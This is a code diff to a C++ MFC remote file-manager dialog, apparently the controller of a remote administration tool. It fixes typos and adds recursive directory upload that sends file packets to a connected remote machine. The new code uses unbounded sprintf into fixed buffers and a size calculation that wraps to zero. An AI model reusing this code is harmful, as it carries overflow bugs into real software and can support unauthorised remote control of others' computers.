@@ -691,7 +691,7 @@ void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)
 		if (pDropWnd->IsKindOf(RUNTIME_CLASS(CListCtrl)))
 		{
 			m_pDragList = (CListCtrl *)pDropWnd;
-			DropItemOnList(m_pDragList, m_pDropWnd);
+			DropItemOnList(m_pDragList, m_pDropList);
 		}
 	}
 	CDialogEx::OnLButtonUp(nFlags, point);
@@ -754,7 +754,7 @@ void CFileManagerDlg::FixedRmoteDriveList()
 		CString str;
 		str.Format("%c:\\", pDrive[i]);
 		int nItem = m_list_remote.InsertItem(i, str, nIconIndex);
-		m_list_remote.SetItemState(nItem, 1);
+		m_list_remote.SetItemData(nItem, 1);
 
 		//显示磁盘大小
 		memcpy(&TotalMB, pDrive + i + 2, 4);
@@ -920,7 +920,7 @@ void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
 		1);
 
 	//避免ListView闪烁，使用SetRedraw
-	m_list_remote>SetRedraw(FALSE);
+	m_list_remote.SetRedraw(FALSE);
 
 	if (dwBufferLen != 0)
 	{
@@ -1001,7 +1001,7 @@ void CFileManagerDlg::OnUpdateLocalPrev(CCmdUI *pCmdUI)
 void CFileManagerDlg::OnRemotePrev()
 {
 	// TODO: 在此添加命令处理程序代码
-	FixedRemoteFileList("..");
+	GetRemoteFileList("..");
 }
 
 //为根目录时禁用向上按钮
@@ -1243,11 +1243,98 @@ bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
 	return true;
 }
 
+bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
+{
+	char lpszFilter[MAX_PATH];
+	char *lpszSlash = NULL;
+	memset(lpszFilter, 0, sizeof(lpszFilter));
+
+	lpszSlash = (lpPathName[lstrlen(lpPathName) - 1] != '\\') ? "\\" : "";
+
+	sprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);
+
+	WIN32_FIND_DATA wfd;
+	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
+	if(hFind == INVALID_HANDLE_VALUE)
+		return false;
+
+	do 
+	{
+		if(wfd.cFileName[0] == '.')
+			continue;
+		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+		{
+			char strDirectory[MAX_PATH];
+			sprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
+			FixedUploadDirectory(strDirectory);		// 如果找到的是目录，则进入此目录进行递归 
+		}
+		else
+		{
+			CString file;
+			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
+			m_Remote_Upload_Job.AddHead(file);
+		}
+	} while (FindNextFile(hFind, &wfd));
+
+	FindClose(hFind);
+
+	return true;
+}
+
 BOOL CFileManagerDlg::SendUploadJob()
 {
 	if(m_Remote_Upload_Job.IsEmpty())
 		return FALSE;
 
 	CString strDestDirectory = m_Remote_Path;
+	//如果远程列表已经选中，当作目标文件夹
+	int nItem = m_list_remote.GetSelectionMark();
 
+	//是文件夹
+	if(nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
+	{
+		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";
+	}
+
+	if (!m_strCopyDestFolder.IsEmpty())
+	{
+		strDestDirectory += m_strCopyDestFolder + "\\";
+	}
+
+	//获取将要复制到客户文件任务列表的头一个
+	m_strOperatingFile = m_Remote_Upload_Job.GetHead();
+
+	DWORD dwSizeHigh;
+	DWORD dwSizeLow;
+	//// 1 字节token, 8字节大小, 文件名称, '\0'
+	HANDLE hFile;
+	CString fileRemote = m_strOperatingFile;	//远程文件
+	//得到要保存到远程的文件路径
+	fileRemote.Replace(m_Local_Path, strDestDirectory);
+	m_strUploadRemoteFile = fileRemote;
+
+	hFile = CreateFile(m_strOperatingFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	if(hFile == INVALID_HANDLE_VALUE)
+		return FALSE;
+	dwSizeLow = GetFileSize(hFile, &dwSizeHigh);
+	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;
+	CloseHandle(hFile);
+
+	//构造数据包
+	int nPacketSize = fileRemote.GetLength() + 10;
+	BYTE *bPacket = (BYTE*)LocalAlloc(LPTR, nPacketSize);
+	memset(bPacket, 0, nPacketSize);
+
+	bPacket[0] = COMMAND_FILE_SIZE;
+	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
+	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
+	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);
+
+	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
+
+	LocalFree(bPacket);
+
+	//从任务列表里删除
+	m_Remote_Upload_Job.RemoveHead();
+	return TRUE;
 }
